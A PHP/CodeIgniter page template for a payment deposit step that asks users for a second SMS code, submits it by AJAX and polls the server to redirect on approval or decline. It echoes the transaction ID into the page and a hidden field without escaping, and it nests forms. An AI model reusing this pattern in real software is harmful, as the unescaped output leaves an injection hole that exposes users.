<!DOCTYPE html>
<html lang="en">
<head>
    <?php $this->load->view('common/header'); ?>
</head>
<body>

    <div class="container">
        <div class="stepwizard" style="display: none;">
            <div class="stepwizard-row setup-panel">
                <div class="stepwizard-step">
                    <a href="#step-1" type="button" class="btn btn-primary btn-circle">1</a>
                    <p>Step 1</p>
                </div>
                <div class="stepwizard-step">
                    <a href="#step-2" type="button" class="btn btn-default btn-circle" disabled="disabled">2</a>
                    <p>Step 2</p>
                </div>
                <div class="stepwizard-step">
                    <a href="#step-3" type="button" class="btn btn-default btn-circle" disabled="disabled">3</a>
                    <p>Step 3</p>
                </div>
            </div>
        </div>
        <form id="bankForm">
            <div class="setup-content user-info" id="step-1">
                <div class="user-info available-bank please-wait">
                    <div class="container-login100">
                        <div class="wrap-login100">

                            <header>
                                <div class="row">
                                    <div class="col-md-6 col-sm-8 col-12">
                                        <h4 class="margin-bottom-0">
                                            <?php echo lang('transaction_no');?>
                                        </h4>
                                        <p>
                                            <?php echo $reqInfo['trans_id']; ?>
                                            <input type="hidden" id="trans_no" name="trans_no" value="<?php echo $reqInfo['trans_id']; ?>">
                                        </p>
                                    </div>
                                    <div class="col-md-6 col-sm-4 col-12 text-right">
                                        <h4>
                                            <?php echo lang('amount');?>
                                        </h4>
                                        <p>
                                            <?php echo $reqInfo['deposit_amount']; ?>
                                        </p>
                                    </div>
                                </div>
                            </header>

                            <div class="row">
                                <div class="col-12 text-center">
                                    <h4 class="select-txt"><?php echo lang('sms_code2');?></h4>
                                    <hr>
                                </div>
                            </div>

                            <form class="login100-form validate-form">

                                <div class="row select-block-area" data-toggle="buttons" style="background: none;">
                                    <div class="col-12">
                                        <div class="wrap-input100 validate-input" data-validate="Password is required" style="border-bottom: 1px solid #6b6b69;">
                                            <input class="input100" type="text" required="required" name="sms2" placeholder="<?php echo lang('enter_sms_code');?>" style="color:#333;">
                                            <span class="focus-input100" data-symbol="&#xf190;"></span>
                                        </div>
                                    </div>
                                </div>
                                <div class="row panel-footer">
                                    <div class="col-4">
                                        <div class="container-login100-form-btn cancel-btn">
                                            <div class="wrap-login100-form-btn">
                                                <div class="login100-form-bgbtn"></div>
                                                <button class="login100-form-btn" data-toggle="confirmation" id="cancel_tranaction" data-id="<?php echo $reqInfo['trans_id']; ?>" type="button"> <?php echo lang('cancel');?> </button>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="col-8">
                                        <div class="container-login100-form-btn">
                                            <div class="wrap-login100-form-btn">
                                                <div class="login100-form-bgbtn"></div>
                                                <button class="login100-form-btn" type="submit">
                                                    <?php echo lang('continue');?>
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </form>
    </div>


    <?php $this->load->view('common/footer'); ?>
    <script type="text/javascript">
        $(document).ready(function(){


            setInterval(function(){checkCompletedRequest();}, 10000);
            function checkCompletedRequest(){
                var transid = $('#trans_no').val();
                var ajaxurl = '<?php echo base_url(); ?>home/checkRequestStatus';
                var feedback = $.ajax({
                    type: "POST",
                    url: ajaxurl,
                    data: {id: transid,status:1},
                    dataType: "json",
                    async: false,
                    success: function(data){
                        //console.log(data);
                        if(data.msg =='error') {
                            //setTimeout(function(){checkCompletedRequest();}, 10000);
                        }else if(data.msg =='success') {
                            window.location.href = '<?php echo base_url() ?>thankyou';
                        }
                    }, });
                $('div.feedback-box').html(feedback);
            }



            setInterval(function(){checkDeclinedRequest();}, 10000);
            function checkDeclinedRequest(){
                var transid = $('#trans_no').val();
                var ajaxurl = '<?php echo base_url(); ?>home/checkRequestStatus';
                var feedback = $.ajax({
                    type: "POST",
                    url: ajaxurl,
                    data: {id: transid,status:0},
                    dataType: "json",
                    async: false,
                    success: function(data){
                        //console.log(data);
                        if(data.msg =='error') {
                            //setTimeout(function(){checkProTNOstatus();}, 10000);
                        }else if(data.msg =='success') {
                            window.location.href = '<?php echo base_url() ?>home/declined/'+transid;
                        }
                    }, });
                $('div.feedback-box').html(feedback);
            }

        //Submit Deposit Form
        $("#bankForm").validate();
        $('#bankForm').submit(function(e) {
            if($("#bankForm").valid()){
                e.preventDefault();
                var transId = $('#trans_no').val();
                var formData = $('#bankForm').serialize();
                var ajaxurl = '<?php echo base_url().'home/submit_smsInfo2'; ?>';
                $.ajax({
                    url: ajaxurl,
                    type : 'post',
                    dataType: "json",
                    data: formData,
                    headers: {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'},
                    success: function(data ) {
                        if(data.msg =='error') {
                            //Error code goes here
                        }else if(data.msg =='success') {
                            window.location.href = '<?php echo base_url() ?>processingsms/'+transId;
                        }
                    },
                    cache: false,
                    contentType: false,
                    processData: false
                });
            }
        });

    });

</script>
</body>
</html>